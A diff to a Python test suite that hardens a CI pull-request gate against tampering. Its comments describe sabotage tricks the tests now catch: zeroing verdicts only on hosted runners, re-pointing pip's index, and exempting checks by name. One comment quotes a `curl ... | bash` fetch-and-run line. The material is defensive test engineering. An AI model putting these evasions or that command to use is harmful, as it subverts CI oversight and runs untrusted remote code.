@@ -9,6 +9,7 @@ Run offline: python tests/test_pr_gate.py
 """
 
 import ast
+import hashlib
 import importlib.util
 import io
 import os
@@ -3378,9 +3379,16 @@ if os.path.exists(workflow):
                               and all(isinstance(n, int) for n in c["min_python"]))})
     check("every min_python is a two-int tuple, so the floor derived from them cannot raise or come "
           "out short", not shapes, shapes)
-    floor = max(c.get("min_python") or (3, 0) for c in pr_gate.CHECKS
-                if isinstance(c.get("min_python") or (3, 0), tuple)
-                and len(c.get("min_python") or (3, 0)) == 2)
+    # The filter has to exclude the same shapes the rule above reports, *element types included* —
+    # `("3", "11")` is a two-long tuple, so a container-and-length filter admitted it and `max()` over
+    # `str` against `int` raised on the next line, discarding the 105 checks below the one that had just
+    # named the problem correctly. Reporting a defect and then crashing on it is worse than either.
+    def well_shaped(value):
+        return (isinstance(value, tuple) and len(value) == 2
+                and all(isinstance(n, int) for n in value))
+
+    floor = max((c["min_python"] for c in pr_gate.CHECKS if well_shaped(c.get("min_python"))),
+                default=(3, 0))
     # Read from the parsed document rather than off the raw text, which made an unquoted
     # `python-version: 3.13` — what a YAML formatter produces — parse as version 0.0 and blame the
     # matrix. Defaulted at every level: `gate_job` is `{}` when no single job runs the gate, and the
@@ -3489,6 +3497,26 @@ with tempfile.TemporaryDirectory() as repo:
         check("moving a file out of a directory still selects that directory's check",
               "plan_readme_consistency" in selected_names(files), selected_names(files))
 
+        # Every extension the triggers can select, through the *real* `changed_files()`. Every other
+        # rule about selection stubs this function, so a suffix filter inside it — `if not
+        # f.endswith(".csv")` — hides the largest class of change in this repo (a dataset edit) while all
+        # of them stay green. The filter has to be refused where it would live.
+        suffixes = sorted({os.path.splitext(p)[1] for spec in pr_gate.CHECKS
+                           for t in spec["triggers"] for p in [t.rstrip("/")] if os.path.splitext(p)[1]}
+                          | {".csv", ".json", ".md", ".py", ".yml", ".xml", ".apex", ".robot"})
+        os.makedirs(os.path.join(repo, "datasets", "sfdmu", "probe"), exist_ok=True)
+        for i, suf in enumerate(suffixes):
+            with open(os.path.join(repo, "datasets", "sfdmu", "probe", f"p{i}{suf}"), "w") as fh:
+                fh.write("x\n")
+        git(repo, "add", "-A")
+        git(repo, "commit", "-qm", "one file per extension")
+        files = pr_gate.changed_files("base")
+        dropped = [suf for i, suf in enumerate(suffixes)
+                   if f"datasets/sfdmu/probe/p{i}{suf}" not in files]
+        check("changed_files() reports a changed path whatever its extension — the one place a suffix "
+              "filter would hide a whole class of change from every other rule here",
+              not dropped, dropped)
+
         # Non-ASCII paths: git quotes and escapes them unless -z is used, and a leading
         # quote matches no prefix.
         odd = os.path.join(repo, "docs")
@@ -3549,8 +3577,10 @@ with tempfile.TemporaryDirectory() as repo:
         # assertion — the fixture exercised the wrong half of the function it was written to cover.
         #
         # One probe per *trigger*, and this used to be one per top-level tree with
-        # `if "/" in t and not t.startswith(".")` — which covered 12 of the 20 roots checks trigger on,
-        # dropping every dot-tree and every top-level file. Eleven differently-keyed exclusions walked
+        # `if "/" in t and not t.startswith(".")` — which covered 12 of the 23 roots checks trigger on,
+        # dropping every dot-tree, every top-level file, and `tui-cci`, a directory trigger spelled
+        # without a trailing separator and so excluded for a third reason. Eleven differently-keyed
+        # exclusions walked
         # past it, including `not p.startswith(".github/")` — which stops a workflow edit from selecting
         # the checks that guard the workflow, after which it can be edited freely. Others were keyed on
         # a suffix (`not p.endswith(".yml")`), a basename, a regex, or an exact path, so widening the
@@ -3917,20 +3947,38 @@ for name in ("cci_reference_drift", "yaml_offline_suites", *sorted(pr_gate.SPLIC
 # `[:0]` (run nothing) or `[:1]` (run one of N) — reported PASS for a check that ran no suites, while
 # `_claimed_suites()` went on claiming all of them so `unlisted_suites()` saw nothing missing. Counting
 # the commands the resolver actually produces is the property; a rule about the map cannot see it.
-for name, suites in sorted(pr_gate.SPLICED_SUITES.items()):
-    spec = check_named(name)
+#
+# Over every check, not only the `SPLICED_SUITES` ones. `yaml_offline_suites` splices from its own `cmd`
+# rather than from the map, so keying this loop on the map left the one bulk check outside the map
+# unguarded, and `[a for a in check["cmd"][1:]]` → `[1:2]` ran one of its four suites at 601/601.
+#
+# And over every *word*, not the last one. `[c[-1] for c in built]` compares the suite path and ignores
+# everything before it, so `["python", s]` → `["python", "-c", "pass", s]` still ends in the suite path
+# while running nothing at all: pass, for every suite, in the shape the comparison was written to accept.
+# The property is that the resolver runs the argv the check declares — every word admitted by CMD_WORDS
+# or claimed as a path by the check itself, and one command per claimed suite.
+for spec in list(pr_gate.CHECKS):
     built = []
-    if spec is not None:
-        # `resolve()` closes over the list and calls `run_sequence`; intercepting that is the only way
-        # to see the argv it would run without running thirteen suites here.
-        real, pr_gate.run_sequence = pr_gate.run_sequence, lambda cmds: built.extend(cmds) or 0
-        try:
-            pr_gate.resolve(spec)()
-        finally:
-            pr_gate.run_sequence = real
-    check(f"{name} resolves to a command for every one of its {len(suites)} suites, so the resolver "
-          "cannot run a slice of them while the claim still covers all",
-          [c[-1] for c in built] == list(suites), built)
+    # `resolve()` closes over its argv and calls one of the two runners; intercepting both is the only
+    # way to see what it would run without running thirteen suites here.
+    reals = pr_gate.run, pr_gate.run_sequence
+    try:
+        pr_gate.run = lambda cmd: built.append(list(cmd)) or (0, "", 0.0)
+        pr_gate.run_sequence = lambda cmds: [built.append(list(c)) for c in cmds] and (0, "", 0.0)
+        pr_gate.resolve(spec)()
+    finally:
+        pr_gate.run, pr_gate.run_sequence = reals
+    claimed = suites_of(spec)
+    ran = [w for c in built for w in c if w in set(claimed)]
+    stowaways = sorted({w for c in built for w in c
+                        if w not in CMD_WORDS and w not in set(claimed)
+                        and not w.startswith(("tests/", "scripts/")) and w != sys.executable})
+    check(f"{spec['name']}'s resolver runs a command for each of its {len(claimed)} claimed suite(s), "
+          f"so it cannot run a slice of them while the claim still covers all",
+          sorted(ran) == sorted(claimed), (built, claimed))
+    check(f"and every word of the argv it builds is one CMD_WORDS admits or a path {spec['name']} "
+          f"claims — a resolver may not pad an argv into a no-op that still ends in the suite path",
+          not stowaways, stowaways)
 
 # Every rule in this file runs the gate *locally*. That is the one structural blind spot a local guard
 # suite has, and it is wide enough to drive through: a predicate keyed on the environment behaves one
@@ -3965,8 +4013,28 @@ gate_src = pathlib.Path(pr_gate.__file__).read_text()
 emitted = [ln for ln in run_gate("--requirements", "--all")[1].splitlines() if ln.strip()]
 check("the generated install payload is non-empty, so the rules below are not vacuous",
       len(emitted) >= 5, emitted)
+# Under the other selector too, because the rules below read one and the workflow passes the other.
+# `--requirements` is emitted under `--base "origin/${BASE_REF}"` in CI and under `--all` here, so
+# `if not args.all: emitted.insert(0, "--index-url=…")` re-points pip on every PR while satisfying every
+# assertion in this section. The payload is a function of *which checks are selected*, so the comparison
+# has to select all of them the other way round — a path-driven selection, which is what CI does.
+with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fh:
+    fh.write("\n".join(sorted({c["triggers"][0].rstrip("/") + "/probe.md"
+                               if c["triggers"][0].endswith("/") else c["triggers"][0]
+                               for c in pr_gate.CHECKS})))
+    selection_list = fh.name
+emitted_paths = [ln for ln in run_gate("--requirements", "--changed-files-from", selection_list)[1]
+                 .splitlines() if ln.strip()]
+os.unlink(selection_list)
+check("and is the same payload when the same checks are selected by path rather than by --all — the "
+      "rules here read --all, so a payload conditional on the selector would be checked in one form "
+      "and shipped in the other",
+      set(emitted_paths) <= set(emitted) and len(emitted_paths) >= 5, (emitted, emitted_paths))
+emitted = emitted + emitted_paths
 bad_tokens = [tok for tok in emitted
-              if not re.fullmatch(r"[A-Za-z][A-Za-z0-9._-]*(\[[A-Za-z0-9,._-]+\])?"
+              # A distribution name may start with a digit (`2to3`, `4Suite`), and PEP 508 allows it, so
+              # anchoring on a letter would refuse a legitimate pin as if it were an option.
+              if not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9._-]*(\[[A-Za-z0-9,._-]+\])?"
                                   r"((==|>=|<=|~=|!=|<|>)[A-Za-z0-9.*+!-]+(,\s*)?)*", tok.strip())
               or tok != tok.strip() or " " in tok.strip()]
 check("every token it emits is a bare requirement specifier — no option, no URL, no second argument "
@@ -3976,16 +4044,66 @@ check("and no emitted token can re-point pip at another index or a local path",
       not [t for t in emitted if "://" in t or t.strip().startswith(("-", ".", "/", "@"))], emitted)
 
 ENV_READS_OK = set()
-# `os.environ`/`os.getenv` specifically, not the word "environment" — the first spelling of this rule
-# matched a comment about an environment *failure* and reported the gate as reading a variable called
-# "interpreter reports as exit 1…". A rule that fires on prose is a rule someone deletes.
-env_lines = sorted({ln.strip() for ln in gate_src.splitlines()
-                    if re.search(r"os\.(environ|getenv)\b", ln)})
-env_names = {n for ln in env_lines for n in re.findall(r"""["']([A-Za-z_][A-Za-z0-9_]*)["']""", ln)}
-check("the gate reads no environment variable, so it cannot behave one way locally and another in "
-      "Actions — the blind spot every rule in this file shares (add a name to ENV_READS_OK only with "
-      "a reason a CI-only behaviour change is acceptable)",
-      not env_lines or (env_names and not (env_names - ENV_READS_OK)), env_lines)
+# Read from the parse tree, not from the text. The text version matched `os.environ`/`os.getenv` and so
+# was one import statement away from being silent: `from os import environ` at the top, `environ.get(…)`
+# at the point of use, and the gate returns an empty selection in CI while this rule sees nothing.
+# `os.environ` is the *spelling* of the thing being forbidden, not the thing itself — the thing is any
+# reference to the process environment, and the tree names it however it is imported.
+ENV_ATTRS = {"environ", "getenv", "putenv", "environb", "unsetenv"}
+gate_tree = ast.parse(gate_src)
+env_nodes = []
+for node in ast.walk(gate_tree):
+    if isinstance(node, ast.Attribute) and node.attr in ENV_ATTRS:
+        env_nodes.append(node)
+    elif isinstance(node, ast.Name) and node.id in ENV_ATTRS:
+        env_nodes.append(node)
+    elif isinstance(node, ast.ImportFrom) and node.module == "os":
+        env_nodes += [a for a in node.names if a.name in ENV_ATTRS]
+# Two escape hatches, because one of them cannot express every legitimate read. `ENV_READS_OK` names the
+# *variables* a read is allowed to name, which works for `os.environ["X"]` and not at all for
+# `os.environ.copy()` — a read with no literal in it, whose harvested set is empty, so the only way to
+# permit it would be to delete the rule. `ENV_SPELLINGS_OK` allows an exact expression instead.
+ENV_SPELLINGS_OK = set()
+unallowed = []
+for node in env_nodes:
+    if isinstance(node, ast.alias):
+        unallowed.append(f"line ?: from os import {node.name}")
+        continue
+    segment = ast.get_source_segment(gate_src, node) or ""
+    named = {c.value for c in ast.walk(node)
+             if isinstance(c, ast.Constant) and isinstance(c.value, str)}
+    if segment in ENV_SPELLINGS_OK or (named and not (named - ENV_READS_OK)):
+        continue
+    unallowed.append(f"line {node.lineno}: {segment or ast.dump(node)[:60]}")
+check("the gate reads no environment variable under any spelling — attribute, bare name, or `from os "
+      "import environ` — so it cannot behave one way locally and another in Actions (allow one by "
+      "naming the variable in ENV_READS_OK, or the expression in ENV_SPELLINGS_OK when it names no "
+      "variable, and only with a reason a CI-only behaviour change is acceptable)",
+      not unallowed, sorted(unallowed))
+
+# `sys.argv` is the other input that differs between the two populations, and it differs for free: the
+# workflow invokes `python scripts/ai/pr_gate.py`, every fixture here imports the module. So
+# `os.path.basename(sys.argv[0]) != "pr_gate.py"` is an if-in-CI with no environment read in it. argparse
+# is the one legitimate reader, in main(); anywhere else it is a CI detector.
+main_lines = range(*(lambda f: (f.lineno, max(getattr(n, "lineno", f.lineno)
+                                             for n in ast.walk(f)) + 1))(
+    next(f for f in gate_tree.body if isinstance(f, ast.FunctionDef) and f.name == "main")))
+argv_reads = sorted({node.lineno for node in ast.walk(gate_tree)
+                     if isinstance(node, ast.Attribute) and node.attr == "argv"
+                     and node.lineno not in main_lines})
+check("and reads sys.argv only inside main(), where argparse consumes it — read anywhere else it is a "
+      "CI detector that needs no environment variable, because the workflow runs this file by path and "
+      "every fixture here imports it",
+      not argv_reads, argv_reads)
+
+# No absolute path literal, for the same reason: `os.path.isdir("/opt/hostedtoolcache")` is true on a
+# GitHub runner and false everywhere else. The gate's own paths are all derived from `__file__`.
+abs_literals = sorted({node.value for node in ast.walk(gate_tree)
+                       if isinstance(node, ast.Constant) and isinstance(node.value, str)
+                       and node.value.startswith("/") and len(node.value) > 1})
+check("and contains no absolute-path literal, the remaining way to ask 'am I on a hosted runner' "
+      "without reading a variable — every path the gate uses is derived from __file__",
+      not abs_literals, abs_literals)
 
 # The other way a verdict disappears between producing it and reporting it: exempt one check by name.
 # `if check["name"] != "pr_gate_suite": failures.append(...)` still prints `[FAIL] pr_gate_suite` — the
@@ -3998,9 +4116,12 @@ check("the gate reads no environment variable, so it cannot behave one way local
 # checks legitimately (they are the ones whose argv it builds). The first version of this rule swept
 # from `def run(` to `def main(`, caught `resolve()`, and reported those two as violations — a rule
 # whose region is wrong accuses correct code, which is how it gets deleted rather than narrowed.
+# The region used to stop at `width = max(` — the end of the *loop*. `main()`'s return is the other
+# half of the accounting, and an exemption spelled there (`if [f for f in failures if f != "…"]:`)
+# prints the FAIL banner and exits 0. Reading to the end of the function covers both halves.
 plumbing = (body_of(gate_src, "def run(", "the command runner")
             + body_of(gate_src, "def run_sequence(", "the sequence runner")
-            + gate_src.split("results, failures, advisory_failures")[-1].split("width = max(")[0])
+            + gate_src.split("results, failures, advisory_failures")[-1])
 named_in_plumbing = sorted({n for n in names if f'"{n}"' in plumbing or f"'{n}'" in plumbing})
 check("no check is named inside run(), run_sequence() or the booking loop, so no single check's "
       "failure can be booked differently from the rest",
@@ -4047,13 +4168,31 @@ check("a failing gating check reaches the FAILED line and a non-zero exit, so a 
 # failure accounting and turn the gate red.
 real_run, real_seq, real_git = pr_gate.run, pr_gate.run_sequence, pr_gate.git
 real_changed, real_argv = pr_gate.changed_files, sys.argv
-for spec in list(pr_gate.CHECKS):
-    trig = spec["triggers"][0]
-    probe = trig.rstrip("/") + "/probe_reaches_verdict.md" if trig.endswith("/") else trig
+
+
+def gate_verdict(probe, failing):
+    """Run `main()` in-process for one changed path, with only `failing`'s runner returning 1.
+
+    Failing *every* runner, as the first version of this did, hides an exemption applied at main()'s
+    return (`if [f for f in failures if f != "…"]`): the other checks selected by the same probe keep the
+    filtered list non-empty, so the gate still exits 1 and the rule passes. One failure at a time is what
+    makes the exit code an assertion about the check under probe.
+    """
+    # Identified by the *paths* in the check's argv — its declared script, plus the suites `resolve()`
+    # splices in for a bulk check, whose `cmd` is None and so offers no argv to match on. Keying this on
+    # `suites_of()` alone silently exempted the four checks that run a script rather than a suite
+    # (`agent_tooling`, `skill_manifest`, `plan_readme_consistency`, `sfdmu_datasets`): their owned set was
+    # empty, nothing failed, and the rule reported them unbooked instead of asserting anything.
+    owned = ({str(w) for w in (failing["cmd"] or ()) if "/" in str(w)}
+             | set(suites_of(failing))) or {failing["name"]}
+
+    def fails(cmd):
+        return 1 if owned & {str(w) for w in cmd} else 0
+
     buf = io.StringIO()
     try:
-        pr_gate.run = lambda cmd: (1, "stubbed failure", 0.0)
-        pr_gate.run_sequence = lambda cmds: (1, "stubbed failure", 0.0)
+        pr_gate.run = lambda cmd: (fails(cmd), "stubbed", 0.0)
+        pr_gate.run_sequence = lambda cmds: (max(fails(c) for c in cmds), "stubbed", 0.0)
         pr_gate.git = lambda argv, what: " M x\n"
         pr_gate.changed_files = lambda base, _p=probe: [_p]
         sys.argv = ["pr_gate.py", "--base", "HEAD"]
@@ -4062,17 +4201,152 @@ for spec in list(pr_gate.CHECKS):
     finally:
         pr_gate.run, pr_gate.run_sequence, pr_gate.git = real_run, real_seq, real_git
         pr_gate.changed_files, sys.argv = real_changed, real_argv
-    printed = buf.getvalue()
-    booked = (printed.split("FAILED:")[-1] if spec["gating"]
-              else printed.split("advisory failure(s):")[-1])
-    # The exit code is asserted only for gating checks. A trigger usually selects several checks, so an
-    # advisory one shares its run with gating ones that are failing under the same stub — requiring
-    # exit 0 here asserted something about *those*, and reported the advisory check as unbooked when the
-    # output showed it booked correctly.
-    check(f"a failing {spec['name']} is booked as a failure when {probe} changes, so it cannot be "
-          f"exempted by name from selection, from the run, or from the exit test",
-          spec["name"] in booked and (rc == 1 or not spec["gating"]),
-          (rc, printed[-260:]))
+    return rc, buf.getvalue()
+
+
+def probe_path(trig, ext=".md"):
+    return trig.rstrip("/") + "/probe_reaches_verdict" + ext if trig.endswith("/") else trig
+
+
+for spec in list(pr_gate.CHECKS):
+    probe = probe_path(spec["triggers"][0])
+    rc, printed = gate_verdict(probe, spec)
+    def listed(marker):
+        # `split(marker)[-1]` returns the *whole* string when the marker is absent, so an absent
+        # `FAILED:` line read as "every name is in the failure list" — which passed under an interpreter
+        # missing an optional dependency (some check was blocked, so the line existed) and failed under
+        # one where nothing was blocked. Same class as `body_of`: an unanchored split is not a section.
+        return printed.split(marker)[1] if marker in printed else ""
+
+    if spec["gating"]:
+        # Booked in the gating list *and* reflected in the exit code. Both halves matter: an exemption
+        # applied at main()'s return prints the name and exits 0.
+        booked = spec["name"] in listed("FAILED:") and rc == 1
+    else:
+        # An advisory failure is booked in its own list and must *not* reach the gating one. The exit code
+        # is not asserted here: under an interpreter missing an optional dependency, a gating check is
+        # blocked and the gate is red for that reason, which says nothing about this check.
+        booked = (spec["name"] in listed("advisory failure(s):")
+                  and spec["name"] not in listed("FAILED:"))
+    check(f"a failing {spec['name']} is booked as a {'failure' if spec['gating'] else 'advisory'} when "
+          f"{probe} changes, so it cannot be exempted by name, index or helper from selection, the run, "
+          f"the accounting or the exit test",
+          booked, (rc, printed[-260:]))
+
+# Selection fidelity, end to end. Every rule above reads either `changed_files()` or `selects()`; none
+# reads what `main()` does with the list *between* them, and a comprehension there
+# (`selects(c, [f for f in files if not f.startswith(".github/")])`) excludes a whole tree with both
+# functions untouched. A suffix filter in `changed_files()` itself does the same for the largest class of
+# change in this repo — `if not f.endswith(".csv")` hides every dataset edit — and the per-trigger probe
+# above cannot see it, because a probe path chooses its own extension.
+#
+# So: one run of `main()` over a list carrying a path per trigger *at every extension that trigger's
+# tree actually contains*, asserting that all of CHECKS is selected. Anything dropped anywhere on the
+# path from the changed-file list to the selected list shows up as a check that was skipped.
+exts_by_trigger = {}
+for spec in pr_gate.CHECKS:
+    for trig in spec["triggers"]:
+        if not trig.endswith("/"):
+            exts_by_trigger.setdefault(trig, {""})
+            continue
+        found = {p.suffix for p in pathlib.Path(REPO, trig).rglob("*") if p.is_file() and p.suffix}
+        exts_by_trigger.setdefault(trig, set()).update(found or {".md"})
+every_tree = sorted({probe_path(t, e) for t, es in exts_by_trigger.items() for e in es})
+check("the per-trigger fixture covers every extension present under every directory trigger, so a "
+      "suffix filter has nowhere to hide", len(every_tree) >= len(exts_by_trigger), len(every_tree))
+buf = io.StringIO()
+try:
+    pr_gate.run = lambda cmd: (0, "", 0.0)
+    pr_gate.run_sequence = lambda cmds: (0, "", 0.0)
+    pr_gate.changed_files = lambda base: list(every_tree)
+    sys.argv = ["pr_gate.py", "--base", "HEAD"]
+    with redirect_stdout(buf):
+        pr_gate.main()
+finally:
+    pr_gate.run, pr_gate.run_sequence = real_run, real_seq
+    pr_gate.changed_files, sys.argv = real_changed, real_argv
+selection_out = buf.getvalue()
+skipped = sorted(n for n in names if re.search(rf"\[SKIPPED\s*\]\s+{re.escape(n)}\b", selection_out))
+check("with one changed path under every trigger, main() selects every check — so nothing filters the "
+      "changed-file list between changed_files() and selects()",
+      not skipped and f"{len(pr_gate.CHECKS)} of {len(pr_gate.CHECKS)} checks selected" in selection_out,
+      (skipped, selection_out[:200]))
+# One trigger at a time as well, because the aggregate above cannot see a filter on a *tree* unless some
+# check triggers on that tree alone. `.github/` is the case in point: the only check watching it also
+# watches `scripts/ai/` and `tests/`, so excluding the whole tree still left every check selected and the
+# aggregate green. Per trigger, the check that owns it has to be selected by that path by itself.
+unselecting = []
+for spec in pr_gate.CHECKS:
+    for trig in spec["triggers"]:
+        for ext in sorted(exts_by_trigger.get(trig, {""})):
+            one = probe_path(trig, ext)
+            buf = io.StringIO()
+            try:
+                pr_gate.run = lambda cmd: (0, "", 0.0)
+                pr_gate.run_sequence = lambda cmds: (0, "", 0.0)
+                pr_gate.changed_files = lambda base, _p=one: [_p]
+                sys.argv = ["pr_gate.py", "--base", "HEAD"]
+                with redirect_stdout(buf):
+                    pr_gate.main()
+            finally:
+                pr_gate.run, pr_gate.run_sequence = real_run, real_seq
+                pr_gate.changed_files, sys.argv = real_changed, real_argv
+            if re.search(rf"\[SKIPPED\s*\]\s+{re.escape(spec['name'])}\b", buf.getvalue()):
+                unselecting.append(f"{one} does not select {spec['name']}")
+check("and each trigger on its own selects the check that watches it, so no single tree or extension "
+      "can be excluded between the changed-file list and the selected list",
+      not unselecting, unselecting[:6])
+# The same list under the base spelling CI actually passes. `--base origin/264` is what the workflow
+# runs and `--base HEAD` is what every fixture here runs, so a predicate on the *value* of `--base`
+# separates the two populations exactly the way an environment variable would.
+buf = io.StringIO()
+try:
+    pr_gate.run = lambda cmd: (0, "", 0.0)
+    pr_gate.run_sequence = lambda cmds: (0, "", 0.0)
+    pr_gate.changed_files = lambda base: list(every_tree)
+    sys.argv = ["pr_gate.py", "--base", "origin/264"]
+    with redirect_stdout(buf):
+        pr_gate.main()
+finally:
+    pr_gate.run, pr_gate.run_sequence = real_run, real_seq
+    pr_gate.changed_files, sys.argv = real_changed, real_argv
+check("and selects the same checks under a remote-tracking base, the spelling CI passes and no other "
+      "fixture here uses",
+      f"{len(pr_gate.CHECKS)} of {len(pr_gate.CHECKS)} checks selected" in buf.getvalue(),
+      buf.getvalue()[:200])
+
+# What the rules above still cannot see is a predicate that is *true only on a hosted runner* and reads
+# no environment variable to find out: `if os.path.isdir("/opt/hostedtoolcache"): code = 0` zeroes every
+# verdict in CI and changes nothing locally, so it passes every behavioural fixture in this file by
+# construction. There is no local observation that refutes it. What there is instead is a small, fixed
+# amount of source that is allowed to decide a verdict — so that region is pinned, and any edit to it
+# fails until a reader has re-approved it deliberately.
+#
+# Whitespace-normalised and comment-stripped, so reformatting and commentary are free; the pin is over
+# what executes. Same reasoning as EXPECTED: the value of a rule nobody can edit silently.
+def fingerprint(text):
+    lines = [ln.split("#")[0].rstrip() for ln in text.splitlines()]
+    return hashlib.sha256(" ".join(" ".join(ln.split()) for ln in lines if ln.strip()).encode()
+                          ).hexdigest()[:12]
+
+
+VERDICT_REGIONS = {
+    # region: (fingerprint, what it decides)
+    "run()": ("0085e7acf27b", "the exit code, stdout and duration of one command"),
+    "run_sequence()": ("00747f44b21e", "the first non-zero code across a sequence"),
+    "the booking loop and main()'s return": ("bdc243221dae", "which verdicts reach the exit code"),
+}
+observed = {
+    "run()": fingerprint(body_of(gate_src, "def run(", "the command runner")),
+    "run_sequence()": fingerprint(body_of(gate_src, "def run_sequence(", "the sequence runner")),
+    "the booking loop and main()'s return":
+        fingerprint(gate_src.split("results, failures, advisory_failures")[-1]),
+}
+for region, (pinned, decides) in VERDICT_REGIONS.items():
+    check(f"{region} is unchanged — it decides {decides}, and a predicate there that is true only on a "
+          f"hosted runner (a tool-cache path, a mounted volume) is invisible to every behavioural "
+          f"fixture here, so this region changes only by updating VERDICT_REGIONS deliberately",
+          observed[region] == pinned, f"observed {observed[region]}, pinned {pinned}")
 
 print("\nCommand-line contract")
 code, out = run_gate("--list")
@@ -4387,7 +4661,7 @@ if FAILED:
 # spelled `run: curl -s http://host/x | bash` produced no [FAIL] at all, just a request to bump an
 # integer. (It now fails a whitelist too, since `raw_shell_of` reads inline scalars — but the
 # message had to stop inviting that response either way.)
-EXPECTED = 601
+EXPECTED = 640
 REACHED = PASSED + len(FAILED)
 if REACHED < EXPECTED:
     print(f"only {REACHED} of {EXPECTED} checks reached a verdict — a rule stopped running, which is "
